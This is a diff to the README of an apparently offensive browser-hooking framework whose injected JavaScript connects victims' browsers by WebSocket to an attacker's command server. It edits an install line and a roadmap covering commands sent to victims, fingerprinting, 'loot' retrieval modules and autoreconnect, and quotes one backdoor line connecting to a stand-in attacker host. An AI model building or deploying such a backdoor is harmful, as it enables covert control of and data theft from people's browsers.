@@ -16,7 +16,7 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 <pre>apt-get install nodejs</pre>
 - Websockets (nodejs-library: https://www.npmjs.com/package/websocket) easiest installed with npm (see below)
 - Prompt (nodejs-library: https://www.npmjs.com/package/prompt) easiest installed with npm (see below)
-<pre>apt-get install npm && npm install websockets && npm install prompt</pre> 
+<pre>apt-get install npm && npm install websockets prompt uglify-js </pre> 
 
 # Usage
 - To start the command server, use the following command:
@@ -29,9 +29,11 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 
 # TODO & Roadmap
 - if necessairy ask to clean port (if something is running on it, maybe pinpoint it) (maybe make bash script starter that checks this?)
+- settings and options passed to modules and saved in a way for handler
 - (DONE) For testing, if the servers root is requested, return the spear.html file
-- backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
-- (DONE) interface should take commands to be sent to victims.
+- (DONE) backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
+- interface should take a file to execute (list of commands), 2nd also for when a client connects, also a command on interface to to the same'
+- catch tab for completion
 - (DONE) a new connection should be fingerprinted 
 - ... and merged with the connection object and also logged to a local file with a history of commands.
 - Module system with javascript-scripts in files that are parsed into onliners (maybe minified) and then send. Only knowledge is for returning data with socket.send() and developing a way to also have modules for server-side (retrieval of loot) (Idea: support "file"-tag and "stream-tag" and "data"-tag)
@@ -45,6 +47,8 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 - Guide with modules, builtup and options for loot retrieval
 - modules (attacks) moest be able to run async in sessions (also multiple clients)
 - handler option in modules?
+- fingerprint maybe module,too heavy,  just only a number?
+- Autoreconnect by spear.html
 
 # Examples how to inject
 TODO
